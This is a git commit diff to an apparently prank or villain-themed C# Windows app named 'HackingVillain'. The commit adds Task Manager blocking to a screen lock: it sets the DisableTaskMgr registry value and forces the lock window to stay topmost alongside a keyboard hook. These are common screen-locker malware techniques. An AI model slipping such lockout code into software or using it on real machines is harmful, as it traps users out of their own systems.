5cab9a2875f9ccc935d2b19873a0f2ed4d552d06
phillyai <sonagi.philly@gmail.com>
2017-07-26 10:57:41 +0900

    화면잠금에 작업관리자 차단 추가

--- HackingVillain/LockForm.cs
+++ HackingVillain/LockForm.cs
@@ -7,6 +7,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Runtime.InteropServices;
 using Microsoft.Win32;
 
 namespace HackingVillain
@@ -28,7 +29,8 @@ namespace HackingVillain
             base.OnShown(e);
 
             _hook.Lock();
-
+            TaskManager(false);
+            TopMostAlways.SetTopmost(this.Handle);
         }
 
         /// <summary>
@@ -37,6 +39,7 @@ namespace HackingVillain
         public void Fuck()
         {
             _hook.UnLock();
+            TaskManager(true);
             this.Hide();
         }
 
@@ -49,6 +52,26 @@ namespace HackingVillain
             else
                 objRegistryKey.SetValue("DisableTaskMgr", "1");
             objRegistryKey.Close();
+        }
+    }
+
+    class TopMostAlways
+    {
+        static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
+        static readonly IntPtr HWND_NOTOPMOST = new IntPtr(-2);
+        static readonly IntPtr HWND_TOP = new IntPtr(0);
+        static readonly IntPtr HWND_BOTTOM = new IntPtr(1);
+        const UInt32 SWP_NOSIZE = 0x0001;
+        const UInt32 SWP_NOMOVE = 0x0002;
+        const UInt32 TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE;
+
+        [DllImport("user32.dll")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+
+        public static void SetTopmost(IntPtr handle)
+        {
+            SetWindowPos(handle, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS);
         }
     }
 }
